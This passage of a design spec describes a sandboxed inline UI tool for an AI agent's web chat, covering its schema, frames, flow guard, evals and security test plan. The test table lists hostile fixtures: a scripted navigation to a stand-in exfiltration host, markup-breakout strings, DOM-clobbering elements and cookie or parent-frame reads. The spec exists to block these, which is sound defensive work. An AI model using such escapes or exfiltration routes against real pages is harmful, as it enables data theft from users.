`src/db/migrations/0138_inline_ui_blocks.sql` plus a journal entry (as
`0137`). Additive; no down-migration (repository convention).

| Column | Type | Notes |
|---|---|---|
| `id` | uuid pk default random | |
| `session_id` | uuid not null → `sessions.id` on delete cascade | |
| `run_id` | text not null | per-turn cap, log correlation |
| `agent_id` | text not null | |
| `tool_call_id` | text not null | |
| `title` | text not null | |
| `height_hint` | integer not null default 320 | |
| `css` / `html` / `js` | text not null default `''` | |
| `scripts` | boolean not null | `js.trim() !== ''`, set by the server |
| `tainted` | boolean not null | label had `suspicious`, `private` or `secret` at render time |
| `created_at` | timestamptz default now | |

Indexes `(session_id, created_at)`, `(session_id, run_id)`. Repository
`src/db/repositories/inline-ui-repository.ts`: `create`, `countForRun`,
`countForSession`, `getInSession(id, sessionId)`,
`listForSession(sessionId, since?)` — `since` is the session's `clearedAt`, so
blocks from before a `/clear` are not listed.

### 5.2 Tool `src/tools/inline-ui/index.ts`

Pattern `src/tools/visual/index.ts`; registered in `MODULES`. Manifest
permissions `render` ALLOW, `read` ALLOW.

| Handler | Options |
|---|---|
| `render` | `{ permissionAction: 'render', injectSecrets: false, excludeFromCodemode: true }` |
| `get` | `{ permissionAction: 'read', readOnly: true, injectSecrets: false }` |
| `guide` | `{ permissionAction: 'read', readOnly: true, injectSecrets: false }` |

`excludeFromCodemode` is a new optional field on `ToolHandler`
(`src/core/agent-base.ts:73-107`), copied in `registerTool`
(`base-tool.ts:78-101`); `scriptableTools` checks it (`codemode.ts:84-92`).
`streamInput` is added in P4, not here.

**`render` steps**
1. `context.root && context.metadata?.inlineUiOffered` and no stored DENY, or
   `ToolNotExecutedError`.
2. Lint (§4.3), limits (§4.4), esbuild syntax check — each failure a
   `ToolNotExecutedError` naming rule, field and limit.
3. Truncation: missing or empty `html` → "html is missing — the call was
   probably cut off by the output limit; make the UI smaller (target under
   12 KB)". `html` ending inside a tag, or `js` failing to parse at its end,
   get the same advice.
4. Per-turn and per-session caps.
5. Insert the row (`tainted` from `getFlowLabel(sessionId)`).
6. Log `info` with `runId`, `blockId`, sizes, mode; on failure the refusal code.
7. Return

```json
{ "rendered": true, "id": "<uuid>", "mode": "scripted",
  "note": "Shown inline in the user's web chat. Don't repeat it as text; add at most one sentence. To change it later, call inline-ui__get with this id and render a new version.",
  "__workStream": { "inlineUi": { "id": "<uuid>", "title": "…", "heightHint": 320, "scripts": true, "tainted": false } } }
```

**`get`** — `{ id }` → `{ id, title, css, html, js, createdAt }` if the block
belongs to the current session, else `ToolNotExecutedError("not found in this
session")`.

**`guide`** — returns `src/tools/inline-ui/guide.md` (§9.2), md-loader import
like `src/tools/artifacts-toolbox/design-guide.md`.

### 5.3 Flow guard and approvals

- `classifyFlow` (`flow-guard.ts:101-169`): `inline-ui` + `render` + non-empty
  `js` → `{ taints: [] }` if the spike passed, `{ taints: [], egress: 'write' }`
  otherwise; static → `{ taints: [] }`.
- `isVaultAuthenticated` (`:505-519`) returns false for `toolId === 'inline-ui'`.
- At `tool-executor.ts:757-762`, for `toolId === 'inline-ui'` pass
  `{ title, sizes, mode }` to `requestApproval` instead of the arguments, so
  neither `permission_requests` nor the event carries 36 KB of source.
- `docs/FLOW-GUARD.md` updated.

### 5.4 History (D12)

Implemented at snapshot write (`agent-worker.ts:797-808`) as a pure function
`stubInlineUiHistory(messages)` in `src/core/agent/inline-ui-history.ts`, unit
tested. The final assistant row's `metadata` (`service.ts:1099-1100`) gets the
`promptContext` note, with block ids found by `getRunId()`.

### 5.5 Work-stream plumbing

- `src/shared/work-stream.ts`: `inlineUi?: { id; title; heightHint; scripts; tainted }`
  on `ToolResultWorkStreamMeta`; union member
  `{ kind: 'inline_ui'; id; title; heightHint; scripts; tainted }`.
- `src/core/work-stream/renderers.ts`: `REGISTRY` entry for
  `inline-ui__render` with title "Showed <title>" and a capped input summary.
- Web `ToolResultPreviewView`: the case plus `default: return assertNever(result)`.
- TUI `summarizeResultPreview`: `interactive answer: <title> (open in the web app)`.

### 5.6 Web

**`web/components/chat/inline-ui-block.tsx`**
- Chat-page chrome (S12): border; header with title (heading), "Interactive
  answer", "Resets when reloaded" on scripted blocks, actions ("View source"
  in the read-only code viewer, "Restart", P3 "Save"); a "Skip interactive
  answer" link before the frame; footer.
- Host document from `buildHostDocument({ mode, css, html, js, theme })`
  (`src/shared/inline-ui/host.ts`); theme tokens from
  `src/shared/inline-ui/theme.ts`, created in P1 from the dark values of
  `ARTIFACT_BASE_CSS` (`src/core/artifacts/widget-render.ts:189`).
- Content runtime (`src/shared/inline-ui/content-runtime.ts`): cache
  primitives; sanitize-and-insert (D6, §4.3); attach js in scripted mode;
  `ResizeObserver` → `height`; `window.onerror`/`unhandledrejection` →
  `error { kind: 'script', errorClass, line }`; `ready` after insertion and
  first `requestAnimationFrame`; link activation → `link`; blank check (no
  text, SVG or canvas) → `error { kind: 'blank' }`.
- Host runtime (`src/shared/inline-ui/host-runtime.ts`): create the content
  frame; relay validated content messages (clamp, rate, cap); emit `stopped
  { reason: 'navigation' | 'flood' }` from its own observations (content
  `load` after the first, `securitypolicyviolation` on `frame-src`, message
  flood). Content-frame messages cannot produce `stopped`.
- **Bridge messages** (`src/shared/inline-ui/bridge.ts`), host → chat page,
  P1: `ready`, `height`, `error`, `link`, `stopped`. P2 adds `prompt`. Chat
  page → host, P4 only: `update`. Generated code sees one frozen global,
  `octi`: P1 `octi.openLink(url)`, P2 `octi.prompt(text)`.
- Lifecycle: mount within one viewport of view (IntersectionObserver); at
  most 6 mounted blocks (3 below 640 px); least recently visible unmounted to
  a placeholder with "Show".
- **Freeze marker (T6):** before mounting any block, set
  `localStorage['octi-ui-mounted:<id>'] = 1`; remove it on clean unmount and
  on the chat page's `pagehide`. A hung renderer never fires `pagehide`, so a
  marker found at page load means that block was mounted when the tab died:
  it shows "Stopped — the page froze while this was open" with Run. Storage
  access in try/catch with a logged warning (fail loud, no swallow).
- Click-to-run per D10.
- States: loading source · ready · waiting for click · script error · stopped
  (navigation / flood / froze) · blank · unavailable (404 or fetch failed,
  Retry) · session deleted.
- Links: a `link` message shows a chip under the frame with the full URL as
  `<a target="_blank" rel="noopener noreferrer">`; non-`https:` URLs and URLs
  with credentials are dropped.
- Focus guard (S14).

**`web/app/chat/page.tsx`**
- On `tool_call_complete` with `result.kind === 'inline_ui'` from the root
  agent of the open session (`TrackedAgent.root`): add an `inline_ui` entry
  with the clamped envelope timestamp (D3).
- `loadSessionMessages` also fetches the listing; a 404 from an older server
  means "no blocks" with one `console.warn`; a malformed body shows
  "unavailable".
- Auto-scroll also on new `inline_ui` entries and frame growth, only when the
  user is within 120 px of the bottom.
- `chat.send` carries `renders: ['inline_ui']` (D14).

**Client outcomes reach the model (G3, T13).** The page keeps per-block
outcomes (`script-error`, `blank`, `stopped-navigation`, `stopped-flood`,
`froze`) with `errorClass` (from a fixed list: `TypeError`, `ReferenceError`,
`RangeError`, `SyntaxError`, `Error`, `other`) and a line number. The next
`chat.send` carries `inlineUiReports: [{ id, outcome, errorClass?, line? }]`
(Zod: enums and integers only, ≤ 20). The composer shows "Report attached for
1 interactive answer" and lets the user remove it.

Server path: `message-handler` → `handleMessage(…, { inlineUi: { renders, reports,
provenance } })` → root-runner extras → validated (ids must belong to the
session) → one line pushed into the root prompt's volatile part → stored on
the user row as `promptContext` (`agent-worker.ts:609-633`), so it reaches the
model in both the snapshot and the rebuild paths. A steered send writes the
same line into the user row's metadata at `message-handler.ts:122` and
prefixes the steer content. Turns that never reach the root agent
(commands, direct responses, `service.ts:723-807`) drop the reports with a
`warn` log. Line format:
`(system note: interactive answer <uuid> reported script-error TypeError line 12)`.

### 5.7 REST

`src/api/routes/inline-ui.ts`:
- `GET /api/sessions/:id/inline-ui` → `{ blocks: [{ id, toolCallId, agentId, title, heightHint, scripts, tainted, createdAt }] }`
  since `clearedAt`.
- `GET /api/sessions/:id/inline-ui/:blockId` → block with source.
- Both: `scopedRepos(principal).sessions.findById(:id)` then the repository;
  404 otherwise; `cache-control: no-store`; 404s not cached.
- `src/api/routes/inline-ui.isolation.test.ts`: two users, a deactivated
  user, impersonation.

### 5.8 Offering (root-runner)

```ts
// after rootIsSmall (root-runner.ts:349)
const inlineUi = await inlineUiOffered({
  root: true,
  audience: (await sessionAudience(session)).kind,
  renders: getRunContext()?.renders,
  small: rootIsSmall,
  denied: await isToolDenied(userId, 'inline-ui'),
});
rootTools = inlineUi
  ? [...rootTools.filter(isNotInlineUi), ...inlineUiHandlers()]
  : rootTools.filter(isNotInlineUi);
if (inlineUi) rootContext.metadata = { ...rootContext.metadata, inlineUiOffered: true };
// lazy branch, root-runner.ts:413:  ...(inlineUi ? ['inline-ui'] : []),
// volatile prompt part, only when offered: one line naming the tool and when to use it
```

`inlineUiOffered` lives in `src/core/agent/inline-ui-offer.ts`. `isToolDenied`
(a stored-DENY lookup through `PermissionManager`, `src/security/permissions.ts:132-240`)
and `rootContext` (the root `AgentContext` root-runner builds) are names for
this sketch; the implementation uses whatever those are called at the time.
`prompt.md` and `prompt.lite.md` do not change. A mirror sentence goes into
the `create_live_artifact` description: "for a one-off visual in this chat,
use inline-ui if available".

### 5.9 Evaluation harness (P1a; AGENT.md requires routing and tool-selection changes to pass `npm run eval`)

- `tool-executor.ts:1093-1099` sets `toolName` on tool rows, taken from the
  call by id (`ToolResult` has no name, `src/core/types.ts:157-162`).
- `POST /api/chat` accepts opt-in `toolsUsed: true` (pattern of `routedRoles`,
  `chat.ts:169-176`) and returns the tool names of rows created in this turn.
- The runner sends `toolsUsed: true`. `uses_tool`/`not_uses_tool` are "not
  evaluable" in unit mode instead of passing or failing trivially; suites
  that used `not_uses_tool` are re-baselined and the change reported.
- YAML `context` gains `renders: [inline_ui]`, passed through `/api/chat` to
  `handleMessage` (eval only). No `channel: webchat`: that would make eval
  turns attended and every ASK would wait for its timeout.

### 5.10 Evaluation suite and gate

`eval/inline-ui.yaml`, ≥ 30 cases, each 3× on at least two models (one
local). Mix: clear positives (calculator, converter, mechanism diagram, chart
of given numbers, scenario comparison); clear negatives (factual question,
code, short list, single value, plain table); ambiguous (inline vs artifact,
"chart my open tasks" with real tool data). Reported as use rates per class.

Mechanical quality checks on every rendered block, by a Playwright harness
that serves stored rows to the real block component (not the stubbed chat
lane): no `error`/`blank`; no CSP violations; each `input[type=number|range]`
set to min, max and empty shows no `NaN`/`Infinity`. Human review of 10
blocks per model.

**Gate before P2:** positives ≥ 70% use, negatives ≤ 10% use, mechanical
checks ≥ 80% clean, on the hosted model. Below the gate, P1 stays, the
description and guide are revised, P2–P4 wait. The gate result, the
lite-tier result and the "guide vs description only" comparison are recorded
in the P1 PR.

---

## 6. P2 — Suggested follow-ups

- Frame: `octi.prompt(text)` → `prompt` (≤ 1 000 chars).
- Chat page: S5/S6 checks, then a strip below the frame at a fixed place,
  frame height locked while it is open: "Suggested by <title>:", the full
  cleaned text, `[Send] [Edit in composer] [Dismiss]`, buttons inert for
  800 ms after appearing or moving. One strip per block.
  - **Send** calls `sendMessage` with `provenance: { inlineUiId }`; during a
    running turn it reads "Send as guidance" (it steers, §1.3).
  - **Edit in composer** calls a new `PromptInput` handle `insertDraft(text,
    source)` (ref + `useImperativeHandle`); it appends on a new line and shows
    a removable "from <title>" chip.
- Provenance: `chat.send` gains `provenance?: { inlineUiId }`; same server
  path as reports (§5.6), id checked against the session. Both the normal
  path (`agent-worker.ts:625`) and the steer path (`message-handler.ts:122`,
  `trySteerRunningRootAgent` gains `{ reports, provenance }`) store
  `metadata: { promptContext, inlineUiProvenance: { id } }`, and the steer
  `chat.message` event (`message-handler.ts:304-310`) carries
  `inlineUiProvenance`. The model-facing line is
  `(system note: the user sent this from interactive answer <uuid>)`. The
  visible bubble's "from <title>" chip reads `inlineUiProvenance`; the text is
  unchanged.
- Disabled while impersonating.

---

## 7. P3 — Save as live artifact

Prerequisites, each its own PR:
1. Fix §13-1 (embed CSP `sandbox` directive).
2. Refactor: move `writeVersion` to `src/core/artifacts/version-writer.ts`;
   `SLUG_RE` (duplicated at `src/api/routes/artifacts.ts:22` and
   `src/tools/artifacts/index.ts:24`) to `src/shared/artifacts.ts`; make
   `ARTIFACT_BASE_CSS` import the tokens from `src/shared/inline-ui/theme.ts`.
3. Artifact `network` column (`'default' | 'none'`) and `buildEmbedCsp`
   support (D15).

Feature:
- "Save as artifact" on a block; disabled with a reason when there is no
  workspace or the block is `tainted`.
- Dialog: title, slug, visibility `private` (default) or `workspace`. It says
  "a static copy — no data refresh". If the source uses `octi.*`, it warns
  that those buttons will show "not available here".
- `POST /api/sessions/:id/inline-ui/:blockId/promote` → scoped session check
  → workspace from `artifactStore(principal)` (`src/api/routes/artifacts.ts:71`)
  → template = sanitized html serialized by the same rules, css, and js passed
  to `writeVersion` as script content through the bundler path (no string
  concatenation of `<script>`) with an `octi` shim whose methods reject with
  a visible message → artifact created with `network = 'none'`.
- A user action under the user's own session; no agent ASK.

---

## 8. P4 — Streaming preview (conditional)

**Precondition.** Measure per provider whether tool arguments arrive in more
than one chunk (hosted Anthropic, OpenAI, OpenRouter; Ollama; Gemini; the
LiteLLM proxy). Build P4 only if the providers used by the eval models stream
them; otherwise revisit §14-Q1.

**Server**
- `streamInput?` on `ToolHandler`, set on `render`.
- `collectStream` gains `onToolCallDelta(key, name, fragment)`
  (`stream-collect.ts:41-51`).
- The worker forwards fragments only when `name` is an offered root handler
  with `streamInput` **and**, checked on every emit, the session label has no
  `secret`; one emit per 150 ms per call:
  `thought { type: 'tool_input_delta', toolCallId, name, delta, iteration }`.
- `event-bridge.ts` → gateway event `chat.tool_input_delta` (literal `type:`
  at the publish site for the catalog); `agent-manager.ts:377` treats it like
  `text_delta`; `event-bus.ts:25` adds it to `UNRECORDED_TYPES`. Federation
  drops it (`src/core/federation/virtual-connection.ts:69`).

**Client**
- `src/shared/inline-ui/partial-args.ts` extracts `title`, `css`, `html`,
  tolerating any key order and fragments that split an escape; never `js`.
- Preview = the P1 frames in static mode. The chat page sends `update { css,
  html }` to the host at most every 300 ms; the host checks
  `event.source === parent` (cached) and the correlation id, then forwards to
  the content runtime, which re-sanitizes exactly as in D6. The runtime
  sources change in P4 (the hash pinned in tests is updated).
- Previews are keyed `(agentId, iteration, toolCallId)` and destroyed on
  `tool_call_complete` of any status, on that call's `observation`, on the
  agent's terminal status, or after 30 s without deltas. The final block
  always mounts from the stored source.
- Old clients ignore the unknown event (`page.tsx:1039`).

---

## 9. Guidance

### 9.1 `render` description (≈ 600 tokens)

1. When: a control, a calculation, a stepper, or a chart of given or
   retrieved numbers helps more than text. At most one per answer unless
   asked.
2. When not: prose, code, lists, a single value, a table (markdown),
   anything to keep, share or refresh (artifacts).
3. Contract: `title`, `css`, `html`, `js` (best-effort order: styled first
   paint); target under 12 KB; limits; no network, storage, forms, remote
   images, file or password inputs, or inline `on*` handlers — use
   `addEventListener` in `js`; links become chips the user clicks.
4. Quality: labelled inputs, keyboard access, `role="status"` for results;
   validate numbers (`valueAsNumber`, `Number.isFinite`, bounds, no division
   by zero, never show NaN); label sample vs user vs retrieved vs calculated
   values; render untrusted strings with `textContent`.
5. Theme tokens `--octi-*`; width 100%, `min-width: 0`, wrap at phone width.
6. `octi.openLink(url)` (from P2 `octi.prompt(text)`) only from a click handler.
7. `inline-ui__guide` has SVG chart and diagram recipes.

### 9.2 `src/tools/inline-ui/guide.md` (≈ 2 000 tokens, v1 in P1)

Adapted from OIUI's `master-playbook`, `advanced-visualization` and
`svg-diagrams` (MIT, attribution in the header): SVG bar/line chart recipe
with axes, labels and a text alternative; SVG diagram template (boxes,
arrows, `marker`, `viewBox`); canvas sizing with `ResizeObserver`; reduced
motion; accessible stepper and slider; numeric validation examples.

---

## 10. Cross-cutting

### 10.1 Cost

- Render: 12 KB ≈ 3.5 k output tokens; 36 KB ≈ 10 k; counted by existing
  budgets (`agent-worker.ts:1117-1124,1380-1387`).
- Within the turn, arguments are re-sent on later iterations (at most
  4 × 36 KB). On later turns only the stub (D12).
- `guide`: one extra iteration when used.
- Schema: three handlers ≈ 900 tokens on offered turns.
- The volatile prompt line is stored on every offered turn's user row and
  re-sent with history (≈ 40 tokens per turn).
- Measured with `src/core/agent/prompt-budget.ts`; reported in the P1 PR.

### 10.2 Privacy and storage

Session content; deleted with the session (cascade) and by idle-session
cleanup; not indexed, shared or sent to other users. Backups need nothing new
(`pg_dump`). Bounded at 200 × 36 KB per session.

### 10.3 Accessibility

Frame `title`; heading in the header; skip link; script errors, stops and
suggestions announced with `role="status"`; focus moves only on a click, or
back to where it was (S14); accessible markup is the default in the
description and checked by the eval.

### 10.4 Operations

- **Kill switch:** a stored DENY on tool `inline-ui`, per user or global,
  makes the offer false; nothing is advertised and nothing fails at call
  time. No flag (house rule 9).
- **Metrics:** `octipus_tool_executions_total{tool,status}`
  (`docs/OBSERVABILITY.md:53`).
- **Logs:** one info line per render (§5.2).
- **Client outcomes:** shown in the block and sent with the next message
  (§5.6); not collected as telemetry.

### 10.5 Compatibility

| Case | Behaviour |
|---|---|
| Old web, new server | Does not declare `renders` → never offered |
| New web, old server | Listing 404 → no blocks; `renders`, `inlineUiReports`, `provenance` stripped by the non-strict `ChatSendSchema` |
| REST fallback | Not offered (D14) |
| TUI | Not offered; shows "open in the web app" for blocks from the web |
| Channels, MCP, eval | Not offered unless declared |
| CLI-provider root (Claude Code CLI, Codex) | Not offered (D4) |
| Federation peers | No events forwarded |

### 10.6 Docs

New `docs/INLINE-UI.md` (users, contributors, operations, kill switch).
Updates: `docs/FLOW-GUARD.md`, `docs/TOOL-ROUTING.md:45`,
`docs/AGENT-ARCHITECTURE.md:266`, `docs/ARTIFACTS.md`, `docs/OBSERVABILITY.md`,
`docs/DESKTOP.md` (S13), `docs/OPENCLAW-COMPARISON.md:110,149`,
`docs/DEVELOPMENT.md:80-82` and `AGENT.md:207-208`, `CHANGELOG.md`; README
"New in" when shipped.

### 10.7 Catalog

New routes, the P4 event and new module edges change
`docs/architecture/generated/CATALOG.md`; `npm run catalog` in each PR that
adds them (CI: `.github/workflows/ci.yml:64`).

---

## 11. Test plan

| Area | Test | Lane |
|---|---|---|
| Spike | §5.0 | Playwright (3 engines) + manual desktop |
| Lint and limits | every §4.3 row; limits at ±1; JSON-size limit; esbuild check; `{{secret:` | unit `src/shared/inline-ui/*.test.ts`, `src/tools/inline-ui/*.test.ts` |
| Document builders | payload escape of `<`, U+2028/2029; CSP first in head; constant runtime sources (hash pinned); content CSP allowances ⊆ host CSP allowances | unit (string) + Playwright (`document.head.firstElementChild` is the CSP meta; exactly one CSP meta) |
| Breakouts | `</style>` + `<link rel=dns-prefetch>` in css; `</script>`, `<!--<script>` in js; `<plaintext>`, `<textarea>`, `<title>`, unclosed `<!--`, meta refresh, nested `<template>`, `shadowrootmode` in html | Playwright: runtime intact, no request, `ready` received |
| Clobbering | `<img name="getElementById">`, `<img name="body">`, `<form name="querySelector">` | Playwright: runtime works, link handling intact |
| Links | no live `href` after insertion; click/Enter/Space → chip; middle-click and pointerdown cause no request; SVG `set`/`animate` href refused; MathML href removed | Playwright with request recording |
| S1–S3 | frame cannot read `parent.document`, `localStorage`, `document.cookie`; `fetch`, remote img/font/`@import` blocked; `window.open`, form submit, `top.location`, `alert`, `navigator.clipboard`, `execCommand('copy')` fail; no popup; `featurePolicy.allowedFeatures()` empty | Playwright, with a per-test allow-list of expected console messages |
| S4 / D9 | scripted `location=` to routed `https://exfil.test/**` with 200, 204 and a hanging body: no request (spike branch) or block stopped and ASK applied (fallback) | Playwright |
| S5 | messages from the content frame or another frame to the chat page ignored; content cannot forge `stopped`; flood unmounts | Playwright |
| S6 / P2 | strip shows full text; buttons inert for 800 ms; frame height locked while open; nothing sent without a click in the chat page; Edit appends to an existing draft | Playwright |
| Lint ≡ sanitizer | one shared fixture of refused inputs; the server lint and the content runtime refuse/remove exactly the same set | unit + Playwright |
| T6 caps | 201 `<use>`, `<use>` depth 4, 21 filters are cut back by the runtime | Playwright |
| S12 | footer and spacer present; password/file inputs replaced; height clamp | Playwright |
| S14 | programmatic `focus()` in a frame while typing in the composer returns focus and stops the block | Playwright |
| D10 | history scripted block waits; tainted live block waits; impersonation waits; freeze marker → "froze" | Playwright |
| Offer | root × audience × renders × small × denied × CLI provider; customized role row's handlers filtered | unit |
| D14 plumbing | `chat.send` schema, `RunContext.renders`, REST fallback offers nothing | unit |
| Tool | conformance; stores and returns meta; `get` session-scoped; caps; D4 check from a child and from codemode; truncation messages | unit + database |
| History | `stubInlineUiHistory`: success, failure, `get` results, `providerRaw` dropped; snapshot size bounded after N renders; `promptContext` note with ids only | unit + database; live check on Anthropic, Gemini, one OpenAI-compatible provider |
| Reports and provenance | enum-only schema; ids must belong to the session; steer path; dropped with warn when the turn does not reach the root | unit + database |
| Flow guard | spike branch vs fallback classification; vault placeholder refused, no exemption; approval payload is a summary | unit |
| REST | isolation (two users, deactivated, impersonating); `no-store`; envelope; `clearedAt` | database `inline-ui.isolation.test.ts` |
| Web rendering | from stub `tool_call_complete` + stubbed REST (`stubSessions` gains `**/api/sessions/*/inline-ui → { blocks: [] }`); reload; ordering before the reply with skewed clocks; unmount at the cap; TUI `inline_ui` summary; old-server 404 | Playwright `tests/web/inline-ui.spec.ts`; unit for TUI |
| SPA CSP pin | SPA serves no CSP that would break the nonces | unit on `web/serve.mjs` |
| S13 desktop | `set_backend_url` from a content frame refused on three webviews | manual, recorded in the P1 PR |
| P1a | `toolName` on rows; `toolsUsed` boundary; not-evaluable in unit mode | unit + database |
| Promotion | bundle built via bundler; `network='none'` CSP; shim message; tainted refused; visibility limited | database + Playwright |
| Preview (P4) | keys; teardown paths; not persisted, not replayed; not forwarded for unoffered names or `secret`; `update` from a sibling frame ignored; no remote load or navigation | unit + Playwright |
| Evals | §5.10 | `npm run eval` |

---

## 12. Delivery

One phase per PR; refactors and pre-existing fixes are their own PRs.

| PR | Contents | Done when |
|---|---|---|
| Spike | §5.0 | results recorded; D9 branch chosen |
| P1a | Eval harness (§5.9) | tests green; re-baselined suites reported |
| P1 | §5.1–5.8, guide v1, docs | `typecheck`, `lint`, `test`, `test:web`, `catalog:check`, web `tsc` green; P1 rows of §11; eval gate recorded; history live check on three providers; S13 on three webviews; schema token cost reported |
| P2 | §6 | its §11 rows; eval re-run shows no drop |
| §13-1 fix | embed CSP `sandbox` | artifact tests green |
| P3-refactor | §7 prerequisite 2–3 | no behaviour change; tests green |
| P3 | §7 | its §11 rows |
| P4 | §8, only if its precondition holds | provider measurements recorded |

---

## 13. Pre-existing issues found in review (not fixed by this spec, except 1 and 4)

1. **Embed CSP has no `sandbox` directive** (`src/api/routes/artifact-pages.ts:300-303`); in path-prefix mode (`src/core/artifacts/host.ts:15-19`) opening `/__artifacts__/…/embed` at top level runs the bundle with the app origin. Fix: `sandbox allow-scripts`. Required before P3.
2. **OAuth popup listener has no origin check** (`web/components/settings/oauth-section.tsx:82-84`).
3. **Stale docs:** `AGENT.md:207-208` and `docs/DEVELOPMENT.md:80-82` say tools are auto-discovered.
4. **`uses_tool` can never pass** (`src/eval/runner.ts:75,239`). Fixed by P1a.
5. **REST artifact create stores inline scripts without bundling them** (`src/api/routes/artifacts.ts:84-92`); behaviour silently lost. Bundling them changes what REST callers can run and needs its own threat note.
6. **Stale comment:** lazy discovery is described as Ollama-only (`src/core/agent/roles/general/config.ts:12-18`), but it is on for every provider (`src/core/agent/lazy-tools.ts:44-48`).
7. **REST fallback turns are unattended** (no `channel`, `page.tsx:1684`): approvals in a fallback turn are blocked rather than asked. Likely intended, since the tab cannot hear the gateway; worth documenting.
8. **Tauri app commands are not governed by capabilities** (`web/src-tauri/build.rs` has no `AppManifest`). Any webview content in the main window can call `set_backend_url`. Fixed by S13; worth fixing regardless.

---

## 14. Open questions

1. **Fenced block instead of a tool call (D13).** Would stream on every
   provider and avoid HTML inside JSON; needs extraction on message and
   snapshot paths, stripping on non-web clients, and flow-label checks at
   extraction. Decide after the P4 measurement.
2. **Rooms, spaces, group threads.** Proposal: static only, no bridge.
3. **Children.** Return data for the root to render, or render themselves?
4. **Libraries.** Vendor one chart library from the app origin with a
   path-scoped `script-src`, if evals show SVG charts are too costly or poor.
5. **Lite tier.** Keep or drop per the eval.
6. **Light theme.** The frames already take a theme parameter.

---

## Appendix A — Taken from OIUI

| OIUI | Here | Change |
|---|---|---|
| `generateSandboxedUi`, order `initialHeight → placeholderMessages → css → html → jsFunctions → jsExpressions` | `title → height_hint → css → html → js`, best-effort | one js field, no placeholders |
| `process-partial-html.ts` | not used | the runtime sanitizes parsed DOM (D6) |
| Websandbox + Idiomorph, one frame | two constant frames, `innerHTML` swap | no dependency; trusted host outside generated code's realm |
| CSP with 4 CDNs and `'unsafe-eval'`, inline handlers | nonce-only, no network, no eval, no inline handlers | D7, §4.2 |
| `sendPrompt` sends immediately | chat-page suggestion strip | D8 |
| `openLink` opens immediately | link chip | D8 |
| Jev router | description + eval gate | non-goal |
| Skills in the system prompt | contract in the description; recipes behind `guide` | §9 |
| `ResizeObserver` + polling | `ResizeObserver`, coalesced, clamped | — |

## Appendix B — Revision log

**Revision 3.1** (round 3: 1 blocker, 3 majors, 3 minors):
- **CSP inheritance.** The content frame inherits the host CSP. The host CSP now allows everything the content CSP allows, a subset test was added, and the spike tests inheritance and `data:` frames (§4.2, §5.0).
- **Navigation stop signal.** The navigation violation may fire only in the content realm. The stop signal now relies only on what the host observes (D9, spike step 6).
- **CLI roots.** CLI-provider roots are not offered the tool, because their vendor transcript cannot be stubbed (D4).
- **Steered sends.** Provenance is stored as a structured key on both paths, the steer path included (§6).
- **Minors.** Gemini replay warning skipped for stubbed messages; one `handleMessage` option; lint/sanitizer parity and render-cost cap tests.

**Revision 3** (round 2: security; accuracy and consistency — 39 findings, 3 blockers):
- **History.** History stub moved to turn end and extended to drop `providerRaw`, because Anthropic and Gemini replay tool inputs from it. Failed renders and `get` results are also stubbed (D12).
- **Frames.**
  - Single shell replaced by two nested frames, so generated code never shares a realm with the trusted observer.
  - Self-navigation turned out to be a live channel (204 responses, delayed load). Containment is now via the host's `frame-src`, behind a spike, with a write-egress fallback (D6, D9, §5.0).
- **Static mode.** Egress closed: no live hrefs, SMIL/MathML hrefs handled, DOM clobbering defeated by cached primitives (§4.3).
- **Freeze guard.** Covers static blocks and uses a marker that survives a killed tab.
- **Model-facing text.**
  - Client reports carry only enums, error class and line number; no generated text reaches the model.
  - Model-facing notes carry ids, not titles.
  - Reports and provenance go through the volatile prompt part, so they work in the snapshot path; steer path specified.
- **Bridge.** Activation is no longer trusted. The bridge has an input delay, a height lock and a fixed strip.
- **Promotion.** Strict artifact network policy, tainted blocks refused, built via the bundler, depends on §13-1.
- **Desktop.** S13 made concrete: `AppManifest`, IPC origin check, `set_backend_url` test.
- **Other security.** `allow` list rule, file and text-security inputs, focus guard (S14), clipboard test.
- **Code and plumbing.**
  - The §5.8 sketch now compiles against the real code.
  - The offer decision is stored on the root context.
  - `RunContext.renders` comes through `handleMessage`.
  - The REST fallback is not offered.
  - The approval payload is summarized at its source.
  - The theme module is created in P1; esbuild is server-only.
  - The block route carries the session id; listing filtered by `clearedAt`.
  - JSON-size limit added.
  - Eval does not set channel `webchat`.
  - `streamInput` moved to P4; preview `update` message named.
- **Escape text.** The `<` escape is written in prose so it survives rendering (D6).
- **Citations.** Drift fixed.

**Revision 2** (round 1: four reviewers, 95 findings, 9 blockers):
- **Corrected facts.**
  - The native conversation snapshot replays tool calls.
  - The REST fallback channel is `api`.
  - Group audience exists.
  - `rootAllowedToolIds` only gates children.
- **Vault.** Placeholder injection and the flow-guard exemption closed.
- **Frames and bridge.** Constant shell. Phishing chrome. Freeze guard. Bridge character cleaning. `get` limited to the session. `no-store`. Promotion limits. Desktop IPC check.
- **Product.**
  - Contract moved into the description; suggestion strip; provenance in metadata.
  - Smaller limits; truncation detection.
  - Turn-anchored placement.
  - Eval gate; P4 made conditional; fenced-block alternative recorded.
  - Client capability declaration.
- **Delivery.** Eval harness first; independent phases; listing envelope and test stubs; hand-written migration; handler flags on `ToolHandler`; `timeline-order.ts`; TUI and `assertNever`; kill switch, logs and done criteria; pre-existing issues listed.
